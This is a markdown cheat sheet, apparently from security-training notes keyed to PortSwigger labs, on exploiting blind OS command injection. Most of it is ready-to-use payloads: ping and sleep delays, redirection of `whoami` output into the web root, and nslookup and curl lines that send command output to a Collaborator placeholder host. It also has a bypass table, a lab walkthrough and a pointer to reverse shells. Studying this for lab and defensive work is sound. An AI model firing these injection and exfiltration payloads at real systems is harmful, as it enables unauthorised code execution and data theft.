# OS command injection - Blind

Output isn't reflected (feedback forms, email senders, async jobs). Confirm and exfiltrate via side channels: **time delays**, **output redirection** to a web-readable file, and **OAST** (DNS) detection + data exfil. Still full RCE.

## Quick reference
```
# detect via time delay
x||ping -c 10 127.0.0.1||              # Unix: ~10s delay = injected
& ping -n 10 127.0.0.1 &               # Windows
# output to a file in the web root, then fetch it
||whoami>/var/www/images/output.txt||  ; then GET /image?filename=output.txt
# OAST detect
x||nslookup x.BURP-COLLABORATOR||
# OAST exfil (command output becomes the subdomain)
||nslookup `whoami`.BURP-COLLABORATOR||
```
Decision list: no output -> ping-delay to confirm; then either redirect output to a fetchable file, or use OAST (DNS) to both detect and exfiltrate. Wrap payload in `|| ... ||` so it runs regardless of the surrounding command.

## Root cause
Same as in-band, but the command's stdout never reaches the response (separate process / email / fire-and-forget). Need timing, filesystem, or network side channels.

## Technique
**Time delays:** `& ping -c 10 127.0.0.1 &` makes the response take ~10s (ping sends 10 ICMP packets, 1/s). A delay proportional to your count confirms execution. (`sleep 10` also works on Unix.)

**Output redirection:** redirect stdout to a file under a web-served directory, then retrieve it via the browser: `& whoami > /var/www/static/whoami.txt &` -> `GET /whoami.txt`. Requires a writable web-root path you can also read.

**OAST detection:** `& nslookup <unique>.COLLAB &` triggers a DNS lookup to your Collaborator domain; an interaction confirms blind injection. (DNS often allowed even when HTTP egress is blocked.)

**OAST exfiltration:** embed command output in the DNS subdomain: `& nslookup \`whoami\`.COLLAB &` -> Collaborator shows `wwwuser.COLLAB`. Backticks/`$()` run inline; the result becomes the label.

**Advanced / edge:** chunk long output across multiple lookups; `$(cmd)` if backticks filtered; URL-encode spaces (`+`); `||` ensures execution when the preceding command errors on your injected prefix.

## Payload arsenal
```
x||ping -c 10 127.0.0.1||              x||sleep 10||
||whoami>/var/www/images/output.txt||      (then fetch filename=output.txt)
x||nslookup x.COLLAB||
||nslookup `whoami`.COLLAB||           ||nslookup $(whoami).COLLAB||
||curl http://COLLAB/$(id|base64)||     # exfil via HTTP if allowed
```

## Bypasses
| Blocker | Bypass |
|---|---|
| no output reflected | time delay / file redirect / OAST |
| HTTP egress blocked | DNS via `nslookup` |
| can't read output | encode into Collaborator subdomain |
| input quoted | close quote then `||cmd||` |

## Exploitation walkthrough (OAST exfil)
1. Feedback form `email` param. Set `email=||nslookup \`whoami\`.COLLAB||` (Insert Collaborator payload).
2. Poll Collaborator -> a DNS interaction `wwwuser.COLLAB` appears.
3. The leftmost label is the `whoami` output -> submit it -> solved.

## Chaining
- -> full RCE / reverse shell; pivot internally.
- OAST shared with [SQLi OAST](../../SQL-injection/Out-of-band-OAST/), [SSRF Blind](../../SSRF/Blind/).

## Tools
- **Burp Repeater** + **Collaborator** (detect/exfil), **Burp Scanner** (async detection).

## Labs

### Blind OS command injection with time delays [Practitioner]
URL: .../lab-blind-time-delays - `email=x||ping+-c+10+127.0.0.1||` -> 10s response. Insight: ping count controls delay; timing confirms blind injection.

### Blind OS command injection with output redirection [Practitioner]
URL: .../lab-blind-output-redirection - `email=||whoami>/var/www/images/output.txt||`, then `filename=output.txt` -> output in response. Insight: redirect stdout to a web-readable file, fetch it.

### Blind OS command injection with out-of-band interaction [Practitioner]
URL: .../lab-blind-out-of-band - `email=x||nslookup+x.COLLAB||` -> DNS interaction. Insight: OAST DNS confirms blind injection.

### Blind OS command injection with out-of-band data exfiltration [Practitioner]
URL: .../lab-blind-out-of-band-data-exfiltration - `email=||nslookup+`whoami`.COLLAB||`; Collaborator subdomain = current user. Insight: inline command output exfiltrated via the DNS label.

Real-target transfer: when a command-injection sink shows no output, ladder timing -> file-redirect -> OAST-detect -> OAST-exfil.

## Real-world notes
- Blind/async command injection is extremely common in email/notification/report/queue workers ("Hunting Asynchronous Vulnerabilities").
- DNS exfil is the most reliable channel; HTTP often blocked outbound.

## References
- https://portswigger.net/web-security/os-command-injection (Blind)
